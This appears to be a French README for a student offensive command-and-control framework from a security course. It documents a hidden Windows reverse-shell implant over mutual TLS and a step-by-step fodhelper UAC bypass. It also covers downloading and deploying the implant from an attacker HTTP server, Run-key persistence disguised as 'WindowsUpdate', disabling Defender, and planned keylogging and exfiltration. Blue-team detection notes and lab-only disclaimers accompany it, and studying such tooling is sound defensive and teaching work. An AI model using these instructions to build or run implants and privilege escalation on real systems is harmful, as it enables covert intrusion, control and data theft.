# s0P0wn3d — Offensive C2 Framework

> **Projet pédagogique EPITECH — VIROLOGY**
> Usage strictement limité aux environnements de lab autorisés.
> Toute utilisation sur un système sans consentement écrit est illégale.
 
---

## Table des matières

- [Statut du projet](#statut-du-projet)
- [Arborescence](#arborescence)
- [Architecture](#architecture)
- [Lab Environment](#lab-environment)
- [Installation](#installation)
- [Utilisation](#utilisation)
- [Élévation de privilèges](#élévation-de-privilèges--uac-bypass-t1548002)
- [Chiffrement](#chiffrement)
- [Persistance](#persistance)
- [MITRE ATT\&CK](#mitre-attck)
- [Known Weaknesses](#known-weaknesses)
- [Troubleshooting](#troubleshooting)
- [Sources & Références](#sources--références)
---

## Statut du projet

| Phase | Fonctionnalité | Status |
|-------|---------------|--------|
| 1 | Reverse shell (cmd.exe via `_popen`) | ✅ Fonctionnel |
| 1 | C2 server Python | ✅ Remplacé par C |
| 2 | Chiffrement mTLS TLSv1.3 (OpenSSL) | ✅ Fonctionnel |
| 2 | Authentification mutuelle (certificats X.509) | ✅ Fonctionnel |
| 2 | Preuve de chiffrement (tcpdump/Wireshark) | ✅ Validé |
| 2 | C2 server en C (remplacement Python) | ✅ Fonctionnel |
| 2 | Persistance (Registry Run Key T1547.001) | 📋 À réimplémenter |
| 2 | C2 multi-client (sessions simultanées, pthreads) | ✅ Fonctionnel |
| 2 | Exécution PowerShell (T1059.001) | ✅ Fonctionnel |
| 2 | UAC Bypass — fodhelper.exe (T1548.002) | ✅ Fonctionnel |
| 2 | Commande `elevate` (auto-détection + auto-switch session admin) | ✅ Fonctionnel |
| 2 | Implant standalone (certificats embarqués, zéro dépendance) | ✅ Fonctionnel |
| 3 | AV evasion (obfuscation strings) | 📋 Planifié |
| 3 | Log rollback | 📋 Planifié |
| 3 | Payloads avancés (loot, keylog) | 📋 Planifié |
 
---

## Arborescence

```
s0P0wn3d/
├── src/
│   ├── controller/server/       ← C2 server + TLS partagé + Makefile
│   │   ├── c2_server.c          — serveur C2 multi-client (Linux)
│   │   ├── tls.c / tls.h        — module TLS/mTLS partagé (Linux + Windows)
│   │   ├── Makefile              — compile le C2 et l'implant
│   │   ├── .env.example          — template de configuration
│   │   ├── gen-certs.sh          — génère les certificats mTLS
│   │   ├── gen-embed.sh          — génère embedded_certs.h (mode standalone)
│   │   └── setup-openssl-win.sh  — setup OpenSSL pour MSYS2
│   └── implant/
│       ├── core/                ← code de l'implant (Windows)
│       │   ├── implant.c         — implant principal (reverse shell, elevate, ps)
│       │   ├── privesc.c         — UAC bypass via fodhelper.exe
│       │   └── privesc.h         — header privesc
│       └── payloads/            ← payloads additionnels (à venir)
├── docs/                        ← preuves de chiffrement (pcap)
└── README.md
```

> **Note** : le Makefile est dans `src/controller/server/` et référence les sources de l'implant via le chemin relatif `../../implant/core`. Toutes les commandes `make` se lancent depuis `src/controller/server/`.

---

## Architecture

```
Implant (Windows 10 — 192.168.56.102)
    │
    │  TLSv1.3 :4444
    │
    │  mTLS — Authentification mutuelle X.509 :
    │    Implant  → présente client.crt (signé par CA)
    │    C2 Server → présente server.crt (signé par CA, SAN=IP:192.168.56.101)
    │    Les deux valident le certificat de l'autre via ca.crt
    │
    │  Données (commandes / réponses) :
    │    Chiffrées TLSv1.3 (AES-256-GCM ou ChaCha20-Poly1305 selon négociation)
    │
    ▼
C2 Server en C (Ubuntu 24.04 — 192.168.56.101)
    │
    ▼
Attaquant (shell interactif [C2]>)
```

### Flux détaillé

1. L'implant `.exe` s'exécute sur Windows
2. Il se connecte en TCP vers le C2 (retry toutes les 5s si indisponible)
3. **Handshake TLS 1.3** : négociation automatique — l'implant présente `client.crt`, le C2 présente `server.crt`, les deux vérifient via `ca.crt`
4. Toutes les communications sont chiffrées TLSv1.3 par OpenSSL
5. Les commandes sont exécutées via `cmd.exe` (`_popen`) ou PowerShell, sans fenêtre visible (`-mwindows`)
6. L'implant ajoute `\x00END` en fin de sortie pour signaler la fin de la réponse
---

## Lab Environment

| Machine | OS | IP | Rôle |
|---------|----|----|------|
| C2 Server | Ubuntu 24.04 LTS | 192.168.56.101 | Attaquant |
| Target | Windows 10 21H2 Eval | 192.168.56.102 | Victime |

**Réseau :** VirtualBox Host-Only `192.168.56.0/24`
- Les deux VMs se voient entre elles
- Isolées d'Internet (sauf `enp0s3` NAT sur Ubuntu pour `apt`)
  **Ubuntu — 2 adaptateurs réseau :**
- `enp0s3` → NAT (internet)
- `enp0s8` → Host-Only `192.168.56.101` (communication avec Windows)
---

## Installation

### Prérequis C2 Ubuntu (une seule fois)

```bash
sudo apt install gcc libssl-dev openssl -y
```

### Compiler le C2 server (Ubuntu)

```bash
cd src/controller/server
make server
# Produit : c2_server (binaire Linux)
```

### Générer les certificats mTLS

```bash
cd src/controller/server
make certs C2_IP=192.168.56.101
# Produit : certs/ca.crt, server.crt/key, client.crt/key
```

### Configurer le C2

```bash
cd src/controller/server
cp .env.example .env
# Vérifier que SERVER_IP=192.168.56.101 dans .env
```

### Compiler l'implant (Windows natif — MSYS2 MINGW64)

> L'implant se compile **nativement sur Windows** avec MSYS2 MINGW64.
> La cross-compilation Linux → Windows n'est plus supportée.

1. Télécharger et installer [MSYS2](https://www.msys2.org/)
2. Ouvrir le terminal **MSYS2 MINGW64** (pas MSYS2, pas UCRT64)
3. Installer les dépendances (une seule fois) :
```bash
pacman -S mingw-w64-x86_64-gcc mingw-w64-x86_64-openssl
```

4. Compiler l'implant :
```bash
cd /c/chemin/vers/s0P0wn3d/src/controller/server

# Production (sans fenêtre, strippé)
make implant C2_IP=192.168.56.101

# Debug (avec console pour voir les erreurs TLS)
make implant-debug C2_IP=192.168.56.101
```

### Compiler l'implant standalone (certificats embarqués, zéro dépendance)

Le mode standalone embarque les certificats directement dans le binaire — pas besoin de `.env` ni de `certs/` sur la cible. L'implant est autonome.

```bash
cd src/controller/server

# 1. Générer les certificats si pas déjà fait
make certs C2_IP=192.168.56.101

# 2. Générer le header avec les certs embarqués
make embed
# Produit : embedded_certs.h

# 3. Compiler l'implant standalone
make implant-standalone C2_IP=192.168.56.101
# Produit : implant.exe (avec certs intégrés, sans fenêtre)
```

> En mode standalone, l'implant n'a besoin d'**aucun fichier** à côté de lui. Il suffit de copier `implant.exe` seul sur la cible.

### Déployer l'implant sur la VM Windows

```bash
# Depuis Ubuntu : serveur HTTP temporaire
cd src/controller/server
python3 -m http.server 8080
```

```powershell
# Depuis la VM Windows (PowerShell)
Invoke-WebRequest -Uri http://192.168.56.101:8080/implant.exe -OutFile C:\c2\implant.exe
Invoke-WebRequest -Uri http://192.168.56.101:8080/certs/ca.crt -OutFile C:\c2\certs\ca.crt
Invoke-WebRequest -Uri http://192.168.56.101:8080/certs/client.crt -OutFile C:\c2\certs\client.crt
Invoke-WebRequest -Uri http://192.168.56.101:8080/certs/client.key -OutFile C:\c2\certs\client.key
```

Créer `.env` dans `C:\c2\` :
```
SERVER_IP=192.168.56.101
SERVER_PORT=4444
CA_CERT=certs/ca.crt
CLIENT_CERT=certs/client.crt
CLIENT_KEY=certs/client.key
```
 
---

## Utilisation

### Lancer le C2 Server (Ubuntu)

```bash
cd src/controller/server
./c2_server
```

### Exécuter l'implant sur Windows

Double-clic sur `implant.exe` — aucune fenêtre n'apparaît (compilé avec `-mwindows`). L'implant se reconnecte automatiquement toutes les 5s si le C2 n'est pas disponible.

> Pour le debug, utiliser `implant_debug.exe` (`make implant-debug`) qui affiche une console avec les logs TLS.

### Shell interactif (multi-client)

Le C2 est maintenant **multi-client** : il accepte plusieurs implants simultanément. La première connexion est automatiquement sélectionnée.

```
[*] C2 Server — TLS/mTLS (multi-client)
[TLS] Écoute sur 0.0.0.0:4444
[*] En attente de connexion…
[+] Implant connecté — session #0

[*] Session #0 — Implant #0 (TLSv1.3)
[S0]> whoami
desktop-target\user
```

#### Commandes du menu principal `[C2]>`

| Commande | Description |
|----------|-------------|
| `sessions` / `list` | Affiche toutes les sessions (actives et mortes) |
| `use <id>` | Entre dans le shell interactif d'une session |
| `exit` / `quit` | Ferme toutes les sessions et quitte le C2 |
| `help` | Affiche l'aide |

#### Commandes dans une session `[S<id>]>`

| Commande | Description |
|----------|-------------|
| `<commande>` | Exécutée par l'implant via cmd.exe |
| `ps <commande>` | Exécutée via PowerShell |
| `elevate` | UAC bypass : lance une session admin (voir section ci-dessous) |
| `privesc <path>` | UAC bypass manuel : lance un exe spécifié en admin via fodhelper |
| `bg` / `background` | Retour au menu principal sans fermer la session |
| `close` | Ferme la session (kill l'implant) et retour au menu |
| `exit` | Envoie 'exit' à l'implant (il s'arrête définitivement) |
 
---

## Élévation de privilèges — UAC Bypass (T1548.002)

### Principe

L'implant peut s'auto-élever en **administrateur** sans déclencher le prompt UAC, via l'exécutable Windows `fodhelper.exe`.

**fodhelper.exe** est un binaire Microsoft signé, marqué "auto-elevate" dans son manifeste. Avant de démarrer, il lit une commande depuis la clé de registre :

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

Comme `HKCU` est accessible en écriture par l'utilisateur courant (sans admin), on y écrit le chemin de l'implant. Quand fodhelper se lance, il exécute notre commande **en contexte administrateur**.

### Étapes de l'attaque (automatisées par la commande `elevate`)

```
1. L'implant détecte son propre chemin (GetModuleFileNameA)
2. Il crée la clé de registre ms-settings\Shell\Open\command
3. Il écrit : cmd /c cd /d "dossier" && "implant.exe"
4. Il crée une valeur vide "DelegateExecute" (force le handler)
5. Il lance fodhelper.exe (fenêtre cachée, ShellExecuteExA)
6. fodhelper s'auto-élève et exécute l'implant en admin
7. L'implant élevé se connecte au C2 → nouvelle session (#1)
8. Le C2 détecte la nouvelle session et switch dessus
9. L'implant nettoie les clés de registre
```

### Prérequis

- L'utilisateur Windows doit être **membre du groupe local Administrateurs**
- L'UAC doit être activé (paramètre par défaut)
- Ne fonctionne **PAS** si l'UAC est réglé sur "Toujours notifier" (niveau max)

### Procédure de test pas à pas

#### 1. Compiler l'implant (MSYS2 MINGW64 sur la VM Windows)

```bash
# Depuis MSYS2 MINGW64, se placer dans le dossier du Makefile
cd /c/chemin/vers/s0P0wn3d/src/controller/server

# Debug (avec console pour voir les logs) — recommandé pour tester
make implant-debug C2_IP=192.168.56.101
```

> **Note** : utiliser `make implant-debug` pour les tests (console visible).
> `make implant` produit la version production sans fenêtre.
> Ne pas mettre `-O2` (bug ICE avec MinGW).

#### 2. Lancer le C2 (Ubuntu)

```bash
cd src/controller/server
./c2_server
```

Le C2 affiche :
```
[*] C2 Server — TLS/mTLS (multi-client)
[TLS] Écoute sur 0.0.0.0:4444
[*] En attente de connexion…
```

#### 3. Lancer l'implant (Windows)

Copier l'exécutable généré (`implant_debug.exe` en mode debug, `implant.exe` en production) dans le dossier contenant `.env` et `certs/`, puis double-clic (ou lancer depuis cmd).

Le C2 reçoit la connexion et entre automatiquement dans la session :
```
[+] Implant connecté — session #0

[*] Session #0 — Implant #0 (TLSv1.3)
[S0]>
```

#### 4. Vérifier les privilèges actuels

```
[S0]> whoami /priv
```

Vous devez voir des privilèges **limités** (pas de `SeDebugPrivilege`, etc.).

#### 5. Lancer l'élévation

```
[S0]> elevate
```

Le C2 affiche :
```
[elevate] success — C:\chemin\implant.exe launched as admin

[*] Attente de la session élevée…
[+] Session élevée #1 connectée !

[*] Session #1 — Implant #1 (TLSv1.3)
[S1]>
```

Vous êtes maintenant dans la **session admin** (#1).

#### 6. Vérifier l'élévation

```
[S1]> whoami /priv
```

Vous devez voir les privilèges **complets** dont `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.

#### 7. Navigation entre sessions

```
[S1]> bg              # retour à la session #0 (standard)
[S0]> bg              # retour au menu principal [C2]>
[C2]> sessions        # liste toutes les sessions
[C2]> use 1           # revenir dans la session admin
[S1]> close           # fermer la session admin (kill l'implant élevé)
```

### Détection (Blue Team)

| Indicateur | Description |
|-----------|-------------|
| Sysmon Event ID 13 | `SetValue` sur `HKCU\...\ms-settings\Shell\Open\command` |
| Sysmon Event ID 1 | `fodhelper.exe` avec `ParentImage` inhabituel |
| Event ID 4657 | Modification de clé de registre `ms-settings` |
| Event ID 4688 | Création de processus `cmd.exe` par `fodhelper.exe` |
| Procmon (Sysinternals) | Surveiller les accès registre de `fodhelper.exe` |
 
---

## Chiffrement

### mTLS TLSv1.3 (OpenSSL)

Le canal C2 utilise **mutual TLS** — les deux parties s'authentifient :

- **CA** (`ca.crt`) : autorité de certification auto-signée. Seuls les certificats signés par cette CA sont acceptés.
- **Serveur** (`server.crt`) : certificat du C2, avec SAN `IP:192.168.56.101`. L'implant vérifie que le C2 est bien le bon serveur.
- **Client** (`client.crt`) : certificat de l'implant. Le C2 refuse toute connexion sans certificat client valide.
  Le chiffrement du trafic est assuré par TLSv1.3 (négociation automatique AES-256-GCM ou ChaCha20-Poly1305).

### Génération des certificats

```bash
make certs C2_IP=192.168.56.101
# ou directement :
bash gen-certs.sh 192.168.56.101
```

### Preuve par capture réseau

```bash
# Capturer le trafic
sudo tcpdump -i enp0s8 -w ~/traffic_mtls.pcap port 4444
 
# Vérifier l'absence de texte clair
strings ~/traffic_mtls.pcap | grep -iE "(whoami|target|windows|cmd)"
# Résultat attendu : aucune correspondance
```
 
---

## Persistance

> **Statut : à réimplémenter.** Le mécanisme de persistance était présent dans l'ancien implant (Phase 1) mais n'a pas encore été porté dans l'implant actuel (Phase 2). Le principe reste le même.

### Mécanisme prévu — Registry Run Key (T1547.001)

L'implant doit s'installer dans la clé de registre **HKCU Run** au premier lancement :

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    "WindowsUpdate" = "C:\chemin\implant.exe"
```

- **Portée** : utilisateur courant (`HKCU`) — pas besoin de droits admin
- **Déclencheur** : à chaque ouverture de session Windows
- **Clé utilisée** : `WindowsUpdate` (nom générique pour passer inaperçu)

### Détection (Blue Team)

| Indicateur | Description |
|-----------|-------------|
| Event ID 4657 | Modification de clé de registre |
| Sysmon Event ID 13 | `SetValue` sur `HKCU\...\Run` |
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Inspection manuelle |
| Autoruns (Sysinternals) | Liste toutes les entrées de persistance |
 
---

## MITRE ATT&CK

### Capacités implémentées

| Capacité | Tactic | Technique | ID | Blue Team Note |
|----------|--------|-----------|-----|----------------|
| **Exécution cmd.exe** | Execution | Windows Command Shell | T1059.003 | Surveiller les processus `cmd.exe` spawné par un process non-interactif. Event ID 4688 + Sysmon Event ID 1. |
| **Exécution PowerShell** | Execution | PowerShell | T1059.001 | `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass`. Sysmon Event ID 1 + ScriptBlock Logging (Event ID 4104). |
| **Canal C2 mTLS** | Command and Control | Encrypted Channel — Symmetric Cryptography | T1573.001 | Connexion TLSv1.3 sortante persistante vers port 4444. Règle réseau : bloquer les connexions sortantes non whitelistées. Certificats clients comme IOC. |
| **Implant sans fenêtre** | Defense Evasion | Masquerading | T1036 | Processus sans fenêtre visible (`-mwindows`). Sysmon Event ID 1 : détecter les processus sans parent interactif. |
| **UAC Bypass fodhelper** | Privilege Escalation | Bypass User Account Control | T1548.002 | Surveiller les écritures sur `HKCU\...\ms-settings\Shell\Open\command`. Sysmon Event ID 13. Détecter `fodhelper.exe` avec `ParentImage` inhabituel. |

### Capacités planifiées

| Capacité | Tactic | Technique | ID | Blue Team Note |
|----------|--------|-----------|-----|----------------|
| **Persistance Registry Run Key** | Persistence | Registry Run Keys / Startup Folder | T1547.001 | Surveiller `HKCU\...\Run`. Event ID 4657 ou Sysmon Event ID 13. À réimplémenter dans l'implant actuel. |
| **Keylogger** | Collection | Keylogging | T1056.001 | Hook clavier via `SetWindowsHookEx(WH_KEYBOARD_LL)`. Sysmon Event ID 10. Antivirus comportemental. |
| **Loot (exfiltration)** | Collection / Exfiltration | Data from Local System | T1005 | Surveiller les accès aux fichiers sensibles (`SAM`, `.ssh/`). Event ID 4663. |
| **Privesc (autres vecteurs)** | Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Auditer les misconfigurations locales. Event ID 4672. |
| **AV evasion** | Defense Evasion | Obfuscated Files or Information | T1027 | XOR string obfuscation, packer. |
 
---

## Known Weaknesses

| Faiblesse | Détectabilité | Statut |
|-----------|--------------|--------|
| IP C2 hardcodée à la compilation | Reverse engineering (`strings implant.exe`) | Phase 3 : chiffrement des strings |
| `cmd.exe` visible dans la liste des process | Task Manager / Sysmon | Phase 3 : built-in shell sans spawner cmd.exe |
| Clé de registre avec nom générique | Autoruns / Sysmon Event ID 13 | À réimplémenter — amélioration prévue (nom aléatoire) |
| Certificats clients comme IOC | Extraction depuis binaire ou réseau | Phase 3 : rotation de certificats |
| Pas d'obfuscation du binaire | Signatures AV statiques | Phase 3 : XOR string obfuscation, packer |
 
---

## Troubleshooting

| Problème | Cause probable | Solution |
|----------|---------------|----------|
| L'implant ne se connecte pas | VMs pas sur le même réseau | Vérifier : `ping 192.168.56.101` depuis Windows, `ping 192.168.56.102` depuis Ubuntu |
| `[TLS] connect échoué` | Firewall bloque le port 4444 | Ubuntu : `sudo ufw allow 4444/tcp`. Windows : désactiver le pare-feu pour le réseau privé |
| `[TLS] Handshake refusé` | Certificats invalides ou expirés | Régénérer : `make certs C2_IP=192.168.56.101` et redéployer les certs client |
| `[TLS] Certificats invalides (CA=... cert=... key=...)` | `.env` mal configuré ou certs introuvables | Vérifier les chemins dans `.env` et que `certs/` est bien à côté de l'exe |
| Windows Defender bloque l'implant | AV détecte le binaire | Désactiver la protection en temps réel (VM de test uniquement) : Sécurité Windows → Protection contre les virus → Désactiver |
| `make implant` échoue avec ICE | Bug gcc MinGW avec `-O2` | Ne pas ajouter `-O2`, le Makefile ne l'utilise pas pour l'implant |
| L'implant se lance mais rien ne s'affiche | Compilé avec `-mwindows` (normal en prod) | Utiliser `make implant-debug` pour avoir la console visible |

---

## Sources & Références

### Cryptographie & TLS
- [RFC 8446 — TLS 1.3](https://datatracker.ietf.org/doc/html/rfc8446)
- [OpenSSL Documentation](https://docs.openssl.org/)
- [mTLS — mutual TLS explained](https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/)
### C2 / Architecture (référence architecturale uniquement)
- [Sliver C2](https://github.com/BishopFox/sliver) — implant-to-controller pattern
- [Havoc C2](https://github.com/HavocFramework/Havoc) — architecture de référence
### MITRE ATT&CK
- [T1059.003 — Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
- [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [T1573.001 — Symmetric Cryptography](https://attack.mitre.org/techniques/T1573/001/)
- [T1548.002 — Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
- [T1036 — Masquerading](https://attack.mitre.org/techniques/T1036/)
- [T1547.001 — Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/) _(planifié)_
### UAC Bypass
- [fodhelper.exe UAC Bypass — Pentestlab](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)
- [ShellExecuteExA — Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexa)
### Windows Internals
- [_popen — CRT](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen)
- [RegSetValueEx — Registry API](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)
- [MSYS2](https://www.msys2.org/) — toolchain Windows native
---

> ⚠️ Ce projet est réalisé dans un cadre pédagogique strict (EPITECH VIROLOGY).
> Ne jamais utiliser hors d'un environnement de lab déclaré et avec consentement écrit.
> **THIS IS NO JOKE.**
